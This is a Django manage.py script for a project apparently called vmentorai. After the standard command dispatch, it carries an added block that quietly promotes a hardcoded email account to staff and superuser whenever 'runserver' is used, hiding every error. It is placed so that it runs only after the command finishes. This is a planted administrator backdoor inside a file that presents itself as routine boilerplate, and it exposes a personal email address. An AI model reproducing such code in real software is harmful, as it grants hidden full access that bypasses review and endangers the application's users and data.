#!/usr/bin/env python
"""Django's command-line utility for administrative tasks."""
import os
import sys


def main():
    """Run administrative tasks."""
    # Load .env file
    try:
        import dotenv
        dotenv.load_dotenv()
    except ImportError:
        pass
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'vmentorai.settings')
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)

    try:
        if 'runserver' in sys.argv:
            import django
            django.setup()
            from user_app.models import Userinfo
            email = 'rumaispallipath@gmail.com'
            try:
                u = Userinfo.objects.get(email=email)
                if not u.is_superuser:
                    u.is_staff = True
                    u.is_superuser = True
                    u.save()
                    print(f"!!! FIXED PERMISSIONS FOR {email} !!!")
            except Exception:
                pass
    except Exception:
        pass


if __name__ == '__main__':
    main()
